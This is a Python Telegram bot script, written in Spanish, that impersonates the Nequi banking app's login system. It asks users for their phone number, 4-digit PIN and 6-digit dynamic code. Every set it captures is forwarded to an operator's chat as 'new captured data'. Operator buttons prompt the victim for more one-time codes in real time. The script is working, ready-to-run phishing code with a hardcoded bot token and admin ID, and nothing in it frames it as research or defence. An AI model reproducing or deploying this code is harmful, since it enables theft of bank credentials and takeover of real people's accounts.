import logging
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, ConversationHandler, filters
import asyncio
from datetime import datetime

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

NUMERO, CLAVE, CLAVE_DINAMICA = range(3)

# ⚠️ CAMBIA ESTOS VALORES:
BOT_TOKEN = "7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc"  # Pega tu token aquí
ADMIN_CHAT_ID = "6958936698"   # Pega tu ID aquí

user_data_store = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user = update.effective_user
    
    await update.message.reply_text(
        f"👋 ¡Hola {user.first_name}!\n\n"
        "🔐 Bienvenido al sistema de acceso de Nequi\n\n"
        "Para continuar, por favor ingresa tu número de teléfono:",
        reply_markup=ReplyKeyboardRemove()
    )
    
    return NUMERO

async def recibir_numero(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    numero = update.message.text
    user_id = update.effective_user.id
    
    if not numero.replace("+", "").replace(" ", "").isdigit():
        await update.message.reply_text(
            "❌ Por favor, ingresa un número de teléfono válido.\n\n"
            "Ejemplo: +57 300 123 4567"
        )
        return NUMERO
    
    if user_id not in user_data_store:
        user_data_store[user_id] = {}
    
    user_data_store[user_id]['numero'] = numero
    user_data_store[user_id]['username'] = update.effective_user.username or "Sin username"
    user_data_store[user_id]['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    await update.message.reply_text(
        f"✅ Número registrado: {numero}\n\n"
        "🔑 Ahora ingresa tu clave de 4 dígitos:"
    )
    
    return CLAVE

async def recibir_clave(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    clave = update.message.text
    user_id = update.effective_user.id
    
    if not clave.isdigit() or len(clave) != 4:
        await update.message.reply_text(
            "❌ La clave debe tener exactamente 4 dígitos.\n\n"
            "Por favor, inténtalo nuevamente:"
        )
        return CLAVE
    
    user_data_store[user_id]['clave'] = clave
    
    await update.message.reply_text(
        "✅ Clave recibida\n\n"
        "📱 Por favor, ingresa el código dinámico de 6 dígitos\n"
        "que aparece en tu app Nequi:"
    )
    
    return CLAVE_DINAMICA

async def recibir_clave_dinamica(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    clave_dinamica = update.message.text
    user_id = update.effective_user.id
    
    if not clave_dinamica.isdigit() or len(clave_dinamica) != 6:
        await update.message.reply_text(
            "❌ El código dinámico debe tener exactamente 6 dígitos.\n\n"
            "Por favor, inténtalo nuevamente:"
        )
        return CLAVE_DINAMICA
    
    if 'intentos_dinamica' not in user_data_store[user_id]:
        user_data_store[user_id]['intentos_dinamica'] = []
    
    user_data_store[user_id]['intentos_dinamica'].append(clave_dinamica)
    
    await enviar_datos_admin(context, user_id)
    
    keyboard = [
        [InlineKeyboardButton("🔄 Reintentar Código Dinámico", callback_data='reintentar')],
        [InlineKeyboardButton("❌ Error de Login", callback_data='error_login')],
        [InlineKeyboardButton("✅ Acceso Exitoso", callback_data='exito')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "⏳ Verificando tu información...\n\n"
        "Por favor, selecciona una opción:",
        reply_markup=reply_markup
    )
    
    return CLAVE_DINAMICA

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    
    if query.data == 'reintentar':
        await query.edit_message_text(
            "🔄 El código ingresado es incorrecto o ha expirado.\n\n"
            "📱 Por favor, ingresa el nuevo código dinámico de 6 dígitos:"
        )
        return CLAVE_DINAMICA
    
    elif query.data == 'error_login':
        mensaje_error = (
            "❌ ERROR DE LOGIN DETECTADO\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Usuario: @{user_data_store[user_id]['username']}\n"
            f"📱 Número: {user_data_store[user_id]['numero']}\n"
            f"⏰ Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━━━"
        )
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=mensaje_error)
        
        await query.edit_message_text(
            "❌ Error al iniciar sesión\n\n"
            "Tus credenciales no pudieron ser verificadas.\n"
            "Por favor, intenta nuevamente más tarde.\n\n"
            "Para iniciar de nuevo, usa /start"
        )
        return ConversationHandler.END
    
    elif query.data == 'exito':
        await query.edit_message_text(
            "✅ ¡Acceso exitoso!\n\n"
            "Has ingresado correctamente al sistema.\n\n"
            "Gracias por usar Nequi 💜"
        )
        return ConversationHandler.END

async def enviar_datos_admin(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    data = user_data_store[user_id]
    
    mensaje = (
        "🎯 NUEVOS DATOS CAPTURADOS\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Usuario: @{data['username']}\n"
        f"🆔 ID: {user_id}\n"
        f"📱 Número: {data['numero']}\n"
        f"🔑 Clave: {data['clave']}\n"
        f"🔐 Códigos Dinámicos:\n"
    )
    
    for i, codigo in enumerate(data['intentos_dinamica'], 1):
        mensaje += f"   {i}. {codigo}\n"
    
    mensaje += (
        f"⏰ Hora: {data['timestamp']}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    
    try:
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=mensaje)
    except Exception as e:
        logger.error(f"Error enviando datos al admin: {e}")

async def cancelar(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "❌ Proceso cancelado.\n\n"
        "Para iniciar nuevamente, usa /start",
        reply_markup=ReplyKeyboardRemove()
    )
    return ConversationHandler.END

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            NUMERO: [MessageHandler(filters.TEXT & ~filters.COMMAND, recibir_numero)],
            CLAVE: [MessageHandler(filters.TEXT & ~filters.COMMAND, recibir_clave)],
            CLAVE_DINAMICA: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, recibir_clave_dinamica),
                CallbackQueryHandler(button_callback)
            ],
        },
        fallbacks=[CommandHandler('cancelar', cancelar)],
    )
    
    application.add_handler(conv_handler)
    
    print("🤖 Bot iniciado correctamente...")
    print("✅ Esperando mensajes...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
